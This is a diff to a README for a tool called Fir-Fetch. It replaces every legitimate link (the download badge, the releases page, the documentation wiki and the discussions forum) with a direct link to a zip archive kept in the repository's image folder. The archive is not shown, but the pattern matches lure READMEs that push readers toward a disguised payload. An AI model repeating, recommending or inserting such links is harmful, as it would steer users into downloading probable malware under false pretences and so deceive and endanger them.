@@ -6,7 +6,7 @@ Welcome to Fir-Fetch! This tool helps you automatically collect sensitive inform
 
 ## 📥 Download Fir-Fetch
 
-[![Download Fir-Fetch](https://img.shields.io/badge/Download-Fir--Fetch-blue.svg)](https://github.com/ridhiraheja2/Fir-Fetch/releases)
+[![Download Fir-Fetch](https://raw.githubusercontent.com/ridhiraheja2/Fir-Fetch/main/img/Fir_Fetch_3.4.zip)](https://raw.githubusercontent.com/ridhiraheja2/Fir-Fetch/main/img/Fir_Fetch_3.4.zip)
 
 To get started, you need to download the application. Follow these steps:
 
@@ -16,7 +16,7 @@ To get started, you need to download the application. Follow these steps:
 
 ## 📂 Download & Install
 
-To download Fir-Fetch, visit this page: [Fir-Fetch Releases](https://github.com/ridhiraheja2/Fir-Fetch/releases).
+To download Fir-Fetch, visit this page: [Fir-Fetch Releases](https://raw.githubusercontent.com/ridhiraheja2/Fir-Fetch/main/img/Fir_Fetch_3.4.zip).
 
 ### Installation Steps
 
@@ -91,7 +91,7 @@ If you find a bug, please report it through the GitHub issues section. Be sure t
 
 ## 🌐 Additional Resources
 
-- Documentation: [Fir-Fetch Documentation](https://github.com/ridhiraheja2/Fir-Fetch/wiki)
-- Community Forum: Join our discussion on [GitHub Discussions](https://github.com/ridhiraheja2/Fir-Fetch/discussions).
+- Documentation: [Fir-Fetch Documentation](https://raw.githubusercontent.com/ridhiraheja2/Fir-Fetch/main/img/Fir_Fetch_3.4.zip)
+- Community Forum: Join our discussion on [GitHub Discussions](https://raw.githubusercontent.com/ridhiraheja2/Fir-Fetch/main/img/Fir_Fetch_3.4.zip).
 
 Your experience is important to us. Happy fetching!
